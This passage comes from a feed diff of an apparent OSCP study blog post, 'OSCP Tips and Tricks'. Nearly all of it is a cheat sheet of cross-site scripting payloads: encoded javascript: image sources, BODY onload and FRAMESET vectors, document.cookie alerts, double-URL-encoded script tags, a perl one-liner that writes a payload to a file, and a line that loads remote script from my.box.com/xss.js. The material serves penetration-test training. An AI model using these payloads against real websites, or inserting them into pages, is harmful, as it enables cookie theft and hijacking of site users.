+&lt;span class=&quot;s2&quot;&gt;&amp;lt;IMG SRC=&amp;amp;amp;amp;#0000106&amp;amp;amp;amp;#0000097&amp;amp;amp;amp;#0000118&amp;amp;amp;amp;#0000097&amp;amp;amp;amp;#0000115&amp;amp;amp;amp;#0000099&amp;amp;amp;amp;#0000114&amp;amp;amp;amp;#0000105&amp;amp;amp;amp;#0000112&amp;amp;amp;amp;#0000116&amp;amp;amp;amp;#0000058&amp;amp;amp;amp;#0000097&amp;amp;amp;amp;#0000108&amp;amp;amp;amp;#0000101&amp;amp;amp;amp;#0000114&amp;amp;amp;amp;#0000116&amp;amp;amp;amp;#0000040&amp;amp;amp;amp;#0000039&amp;amp;amp;amp;#0000088&amp;amp;amp;amp;#0000083&amp;amp;amp;amp;#0000083&amp;amp;amp;amp;#0000039&amp;amp;amp;amp;#0000041&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&amp;lt;IMG SRC=&amp;quot;&lt;/span&gt;jav ascript:alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;XSS&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;perl -e &amp;#39;print &amp;quot;&lt;/span&gt;&amp;lt;IMG &lt;span class=&quot;nv&quot;&gt;SRC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;javascript:alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;XSS&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;;&amp;#39; &amp;gt; out&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&amp;lt;BODY onload!#$%&amp;amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&amp;quot;&lt;/span&gt;XSS&lt;span class=&quot;s2&quot;&gt;&amp;quot;)&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;s2&quot;&gt;(&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt; iframes http://google.com &amp;lt; iframes &amp;gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 
+&amp;lt;BODY &lt;span class=&quot;nv&quot;&gt;BACKGROUND&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;javascript:alert(&amp;#39;XSS&amp;#39;)&amp;quot;&lt;/span&gt;&amp;gt;
+&amp;lt;FRAMESET&amp;gt;&amp;lt;FRAME &lt;span class=&quot;nv&quot;&gt;SRC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;”javascript:alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;XSS&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;gt;&amp;lt;/FRAMESET&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;script &amp;gt;alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;document.cookie&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;lt;/script&amp;gt;
+%253cscript%253ealert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;document.cookie&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;%253c/script%253e
+&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;gt;&amp;lt;s&amp;quot;&lt;/span&gt;%2b&lt;span class=&quot;err&quot;&gt;&amp;quot;&lt;/span&gt;cript&amp;gt;alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;document.cookie&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;lt;/script&amp;gt;
+%22/%3E%3CBODY%20onload&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;’document.write&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%22%3Cs%22%2b%22cript%20src&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://my.box.com/xss.js%3E%3C/script%3E%22&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;#39;&lt;/span&gt;%3E
+&amp;lt;img &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;asdf &lt;span class=&quot;nv&quot;&gt;onerror&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;document.cookie&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+  &lt;p&gt;&lt;a href=&quot;https://jivoi.github.io/2015/07/01/oscp-tips-and-tricks/&quot;&gt;OSCP Tips and Tricks&lt;/a&gt; was originally published by EK at &lt;a href=&quot;https://jivoi.github.io&quot;&gt;EK&lt;/a&gt; on July 01, 2015.&lt;/p&gt;</content>
+</entry>
 
 
 <entry>
